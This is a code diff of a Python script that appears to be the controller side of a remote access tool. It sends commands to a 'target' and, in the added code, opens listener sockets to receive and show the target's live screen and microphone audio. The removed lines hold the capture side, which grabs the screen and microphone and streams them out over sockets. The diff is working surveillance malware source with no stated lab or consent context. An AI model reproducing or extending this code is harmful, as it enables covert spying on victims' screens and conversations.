@@ -3,19 +3,15 @@ import json
 import os
 import threading
 import cv2
-import pyautogui
-import mss
 import numpy as np
 import struct
 import pyaudio
-import subprocess
-import sys
-
+import queue
+import multiprocessing
 from dotenv import load_dotenv
 
 # Load environment variables from .env file
 dotenv_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../.env'))
-print(dotenv_path)
 load_dotenv(dotenv_path)
 
 # Set variables based on .env values
@@ -92,6 +88,7 @@ def target_communication(target):
 
         # Common command
         if command == 'quit':
+            stop_screen_stream()
             break
         elif command == 'clear':
             os.system('clear')
@@ -109,89 +106,141 @@ def target_communication(target):
 
         # Screen Streaming
         elif command == 'screen':
-            handle_screen_command()
-            
+            start_screen_stream()
+            screen_process.join()
+           
         # Others
         else:
             result = reliable_recv(target)
             print(result)
 
-# Function to get the virtual environment path
-def get_virtualenv_path():
-    # Check if we are in a virtual environment
-    if hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix):
-        # Python is running in a virtual environment
-        if sys.platform == 'win32':
-            return os.path.join(sys.prefix, 'Scripts', 'activate.bat')
-        else:
-            return os.path.join(sys.prefix, 'bin', 'activate')
+# Constants
+CHUNK = 1024
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
 
-    # If not in a virtual environment, return None
-    return None
+# Helper function to receive data
+def receive_all(sock, count):
+    buf = b''
+    while count:
+        newbuf = sock.recv(count)
+        if not newbuf:
+            return None
+        buf += newbuf
+        count -= len(newbuf)
+    return buf
 
-# Function to handle screen command
-def handle_screen_command():
-    current_dir = os.path.abspath('.')
-    script_path = os.path.join(current_dir, 'screenstream_server.py')
+# Video receiving and displaying
+def video_stream(server_socket, frame_queue):
+    client_socket, addr = server_socket.accept()
+    print('Video connection from:', addr)
 
-    virtualenv_activate = get_virtualenv_path()
-    if virtualenv_activate:
-        if os.name == 'posix':
-            if 'darwin' in os.uname().sysname.lower():  # macOS
-                # Create a new iTerm window and execute the command
-                osascript_command = f'tell application "iTerm"\n' \
-                                    f'  create window with default profile\n' \
-                                    f'  tell current session of current window to write text "cd {os.path.dirname(script_path)} && source {virtualenv_activate} && python3 {os.path.basename(script_path)}"\n' \
-                                    f'end tell'
-                subprocess.Popen(["osascript", "-e", osascript_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                # osascript_command = f'tell app "Terminal" to do script "cd {os.path.dirname(script_path)} && source {virtualenv_activate} && python3 {os.path.basename(script_path)}"'
-                # subprocess.Popen(["osascript", "-e", osascript_command])
-            else:  # Linux
-                terminal_command = f'gnome-terminal -- bash -c "cd {current_dir} && source {virtualenv_activate} && python3 {script_path}; exec bash"'
-                subprocess.Popen(terminal_command, shell=True)
-        # Add elif block for other OS types if needed
-    else:
-        print("Virtual environment not found.")
-    
-def screen_stream(screen_socket):
-    w, h = pyautogui.size()
-    monitor = {"top": 0, "left": 0, "width": w, "height": h}
-
-    try:
-        with mss.mss() as sct:
-            while True:
-                screen = sct.grab(monitor)
-                frame = np.array(screen)
-                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
-                message = struct.pack(">L", len(buffer)) + buffer.tobytes()
-                try:
-                    screen_socket.sendall(message)
-                except BrokenPipeError:
-                    print("Broken pipe error, connection lost.")
-                    break
-    except KeyboardInterrupt:
-        print("Stopped by user.")
-    finally:
-        screen_socket.close()
-
-def audio_stream(audio_socket):
-    p = pyaudio.PyAudio()
-    stream = p.open(format=pyaudio.paInt16,
-                    channels=1,
-                    rate=44100,
-                    input=True,
-                    frames_per_buffer=1024)
     try:
         while True:
-            data = stream.read(1024, exception_on_overflow=False)
-            audio_socket.sendall(data)
-    except KeyboardInterrupt:
-        print("Stopped by user.")
+            message_size = receive_all(client_socket, struct.calcsize(">L"))
+            if not message_size:
+                break
+            message_size = struct.unpack(">L", message_size)[0]
+            frame_data = receive_all(client_socket, message_size)
+            if not frame_data:
+                break
+                
+            frame = np.frombuffer(frame_data, dtype=np.uint8)
+            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
+            frame_queue.put(frame)
     finally:
+        client_socket.close()
+
+# Audio receiving and playing
+def audio_stream(server_socket):
+    client_socket, addr = server_socket.accept()
+    print('Audio connection from:', addr)
+
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT,
+                    channels=CHANNELS,
+                    rate=RATE,
+                    output=True,
+                    frames_per_buffer=CHUNK)
+
+    try:
+        while True:
+            message_size = receive_all(client_socket, struct.calcsize(">L"))
+            if not message_size:
+                break
+            message_size = struct.unpack(">L", message_size)[0]
+            audio_data = receive_all(client_socket, message_size)
+            if not audio_data:
+                break
+            stream.write(audio_data)
+    finally:
+        client_socket.close()
         stream.stop_stream()
         stream.close()
         p.terminate()
-        audio_socket.close()
+
+# Screen streamer
+def screen_streamer():
+
+    # Video streaming
+    video_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    video_server_socket.bind((TARGET_IP, VIDEO_PORT))
+    video_server_socket.listen(5)
+    print("Video server listening at:", (TARGET_IP, VIDEO_PORT))
+    
+    # Audio streaming
+    audio_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    audio_server_socket.bind((TARGET_IP, AUDIO_PORT))
+    audio_server_socket.listen(5)
+    print("Audio server listening at:", (TARGET_IP, AUDIO_PORT))
+    
+    frame_queue = queue.Queue()
+
+    video_thread = threading.Thread(target=video_stream, args=(video_server_socket, frame_queue))
+    audio_thread = threading.Thread(target=audio_stream, args=(audio_server_socket,))
+    
+    video_thread.start()
+    audio_thread.start()
+
+    # Display frames from the queue in the main thread
+    cv2.namedWindow('Received', cv2.WINDOW_GUI_NORMAL)
+    try:
+        while True:
+            if not frame_queue.empty():
+                frame = frame_queue.get()
+                cv2.imshow('Received', frame)
+                if cv2.waitKey(1) & 0xFF == ord('q'):
+                    break
+    finally:
+        cv2.destroyAllWindows()
+
+    video_thread.join()
+    audio_thread.join()
+
+# Function to start screen streaming in a separate process
+def start_screen_stream():
+    global screen_process
+    
+    # Create a new process for screen streaming
+    screen_process = multiprocessing.Process(target=screen_streamer)
+    screen_process.start()
+    
+    # Print process ID for reference
+    print(f"Screen streaming process started with PID: {screen_process.pid}")
+
+# Function to stop screen streaming process
+def stop_screen_stream():
+    global screen_process
+    
+    if screen_process and screen_process.is_alive():
+        # Terminate the process
+        screen_process.terminate()
+        screen_process.join(timeout=1)  # Wait for termination
+        print("Screen streaming process terminated.")
+    else:
+        print("Screen streaming process not running.")
+
 
 def main():
     # Create a socket for the server
